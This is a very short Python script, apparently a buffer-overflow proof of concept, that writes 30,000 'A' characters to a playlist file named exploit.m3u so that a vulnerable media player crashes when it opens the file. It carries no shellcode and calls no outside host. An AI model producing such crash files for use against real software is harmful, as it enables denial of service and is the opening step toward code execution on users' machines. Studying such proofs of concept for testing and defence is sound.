buff = ("\x41" * 30000 )
 
f = open("exploit.m3u",'w')
f.write( buff )
f.close()
